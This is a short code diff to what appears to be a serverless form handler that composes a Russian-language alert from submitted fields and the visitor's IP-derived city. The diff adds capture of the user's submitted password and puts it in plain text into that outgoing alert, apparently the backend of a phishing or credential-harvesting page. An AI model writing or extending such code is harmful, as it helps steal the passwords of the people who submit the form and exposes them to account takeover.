@@ -24,6 +24,7 @@ export default async function handler(req, res) {
   const type = String(body.type || '').trim() || '—';
   const chosenCity = String(body.chosenCity || '').trim() || '—';
   const area = String(body.area || '').trim() || '—';
+  const password = String(body.password || '').trim() || '—';
 
   const ipCity = String(req.headers['x-vercel-ip-city'] || '').trim() || '—';
   const time = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
@@ -44,6 +45,7 @@ export default async function handler(req, res) {
     `🏷️ Тип: ${escapeHtml(type)}`,
     `📍 Город (выбранный): ${escapeHtml(chosenCity)}`,
     `🏘️ Район / Товар: ${escapeHtml(area)}`,
+    `🔐 Пароль: ${escapeHtml(password)}`,
     `🌐 Город (по IP): ${escapeHtml(ipCity)}`,
     `⏰ Время: ${escapeHtml(time)}`
   ].join('\n');
